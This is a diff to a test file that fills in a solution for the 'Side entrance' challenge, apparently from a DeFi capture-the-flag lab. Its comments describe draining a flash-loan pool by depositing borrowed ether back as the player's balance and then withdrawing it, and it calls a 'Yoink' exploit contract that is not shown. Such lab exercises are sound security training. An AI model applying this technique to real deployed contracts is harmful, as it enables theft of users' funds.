@@ -25,7 +25,12 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // The check is only on the balance of the contract, it doesn't check the account balances!
+        // Take loan and deposit it back in the player balance, then withdraw
+
+        yoink = await (await ethers.getContractFactory('Yoink', player)).deploy(pool.address, player.address);
+        await yoink.connect(player).exploit(ETHER_IN_POOL);
+        console.log(await ethers.provider.getBalance(pool.address));
     });
 
     after(async function () {
